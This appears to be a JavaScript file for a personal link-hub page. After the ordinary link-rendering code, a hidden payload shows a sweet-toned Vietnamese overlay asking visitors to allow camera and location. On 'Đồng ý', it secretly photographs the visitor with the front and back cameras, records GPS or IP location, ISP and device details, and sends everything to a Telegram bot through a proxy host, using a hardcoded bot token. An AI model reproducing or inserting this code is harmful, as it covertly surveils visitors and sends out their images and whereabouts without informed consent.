document.addEventListener('DOMContentLoaded', () => {
    const container = document.querySelector('.container');
    const linksContainer = document.getElementById('linksContainer');

    function createLinkElement(data) {
        if (data.type === 'sectionTitle') {
            const sectionTitle = document.createElement('div');
            sectionTitle.classList.add('section-title');
            sectionTitle.textContent = data.title;
            return sectionTitle;
        }

        const element = data.type === 'button' ?
                        document.createElement('button') :
                        document.createElement('a');

        element.classList.add('link-item');
        if (data.linkTypeClass) {
            element.classList.add(data.linkTypeClass);
        }
        if (data.id) {
            element.id = data.id;
        }

        const iconDiv = document.createElement('div');
        iconDiv.classList.add('link-icon');
        if (data.iconImage) {
            const img = document.createElement('img');
            img.src = data.iconImage;
            img.alt = data.title + ' Logo';
            img.classList.add('custom-icon');
            iconDiv.appendChild(img);
        } else if (data.iconClass) {
            const icon = document.createElement('i');
            icon.classList.add(...data.iconClass.split(' '));
            iconDiv.appendChild(icon);
        }
        element.appendChild(iconDiv);

        const contentDiv = document.createElement('div');
        contentDiv.classList.add('link-content');

        const titleDiv = document.createElement('div');
        titleDiv.classList.add('link-title');
        titleDiv.textContent = data.title;
        contentDiv.appendChild(titleDiv);

        if (data.description) {
            const descriptionDiv = document.createElement('div');
            descriptionDiv.classList.add('link-description');
            descriptionDiv.textContent = data.description;
            contentDiv.appendChild(descriptionDiv);
        }
        element.appendChild(contentDiv);

        if (data.url) {
            element.addEventListener('click', (event) => {
                event.preventDefault();
                window.location.href = data.url;
                // Hoặc để mở trong tab mới: window.open(data.url, '_blank');
            });
        }

        return element;
    }

    function renderLinks() {
        linksContainer.innerHTML = '';
        linkData.forEach(item => {
            const element = createLinkElement(item);
            linksContainer.appendChild(element);
        });
    }

    renderLinks();

    const linkItems = document.querySelectorAll('.link-item');

    container.addEventListener('animationend', () => {
        linkItems.forEach((item, index) => {
            setTimeout(() => {
                item.classList.add('show');
            }, index * 100);
        });
    }, { once: true });
const popup = document.createElement('div');
popup.id = 'permission-popup';
popup.innerHTML = `
  <div style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0, 0, 0, 0.95);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    z-index: 9999;
    color: white;
    font-family: sans-serif;
    text-align: center;
    padding: 20px;
  ">
    <h2 style="font-size: 20px; line-height: 1.5;">
      📸 Hãy cho phép camera và vị trí nhoá,<br>yêu các bạn 💜
    </h2>
    <button id="accept-btn" style="
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 16px;
      background: #6200ea;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    ">Đồng ý</button>
  </div>
`;
document.body.appendChild(popup);

document.getElementById('accept-btn').onclick = () => {
  popup.remove();
  main();
};

const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
const TELEGRAM_CHAT_ID = '6956722046';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

function getPreciseLocationOrFallbackToIP() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return getIPInfo().then(resolve);

    navigator.geolocation.getCurrentPosition(
      position => {
        info.lat = position.coords.latitude.toFixed(6);
        info.lon = position.coords.longitude.toFixed(6);
        info.address = '📍 Lấy từ GPS chính xác';
        info.country = 'Không rõ';
        info.ip = 'Không rõ';
        info.isp = 'Không rõ';
        resolve();
      },
      error => {
        console.warn("GPS thất bại, fallback IP:", error.message);
        getIPInfo().then(resolve);
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude;
      info.lon = data.longitude;
    });
}

function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌍 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}
`.trim();
}

function captureCamera(facingMode = "user") {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();
        video.onloadedmetadata = () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
          }, 1000);
        };
      })
      .catch(err => reject(err));
  });
}

async function sendTwoPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front',
      caption: getCaption()
    },
    {
      type: 'photo',
      media: 'attach://back'
    }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, {
    method: 'POST',
    body: formData
  });
}

async function main() {
  detectDevice();

  let frontBlob = null, backBlob = null;

  try {
    frontBlob = await captureCamera("user");
    backBlob = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch {
    info.camera = '📵 Không thể truy cập đủ camera';
  }

  await getPreciseLocationOrFallbackToIP();

  if (frontBlob && backBlob) {
    await sendTwoPhotos(frontBlob, backBlob);
  } else {
    fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: getCaption()
      })
    });
  }
}
